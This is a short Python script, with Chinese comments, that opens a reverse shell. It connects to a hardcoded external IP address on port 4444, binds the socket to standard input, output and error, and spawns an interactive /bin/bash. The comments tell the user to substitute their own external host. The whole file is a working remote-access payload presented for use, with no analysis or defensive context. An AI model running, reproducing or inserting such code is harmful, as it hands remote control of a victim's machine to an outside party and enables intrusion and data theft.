import socket
import os
import pty

REMOTE_HOST = "172.237.65.250"   # 替换为你的外网主机IP
REMOTE_PORT = 4444        # 替换为你的外网主机端口

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((REMOTE_HOST, REMOTE_PORT))
    # 将socket与标准输入/输出/错误绑定
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    # 用pty.spawn获取完整交互式shell
    pty.spawn("/bin/bash")

if __name__ == "__main__":
    main()